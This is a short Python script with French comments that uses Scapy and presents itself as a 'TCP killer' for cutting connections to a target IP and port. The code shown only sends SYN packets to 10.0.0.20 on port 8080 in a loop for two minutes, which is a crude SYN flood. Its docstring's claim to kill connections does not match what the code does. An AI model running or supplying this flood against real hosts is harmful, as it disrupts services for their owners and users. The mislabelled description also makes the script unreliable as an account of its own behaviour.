#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import threading

# La ligne suivante permet de désactiver les messages de scapy concernant la version de Python utilisée.
conf.verb = 0

# Fonction pour killer les connexions TCP
def tcp_killer(target_ip, target_port, duration):
    """
    Fonction pour tuer les connexions TCP vers une adresse IP et un port spécifiés.

    target_ip : str - Adresse IP de la cible.
    target_port : int - Port de la cible.
    duration : int - Durée en secondes pour lequel le script doit exécuter le TCP Killer.
    """
    # Construction du paquet TCP
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags="S")

    # Boucle principale pour envoyer les paquets TCP
    end_time = time.time() + duration
    while time.time() < end_time:
        send(ip/tcp, verbose=0)

# Exemple d'utilisation de la fonction tcp_killer
if __name__ == '__main__':
    target_ip = "10.0.0.20"
    target_port = 8080
    duration = 120  # Durée en secondes pour laquelle le script exécutera le TCP Killer
    tcp_killer(target_ip, target_port, duration)
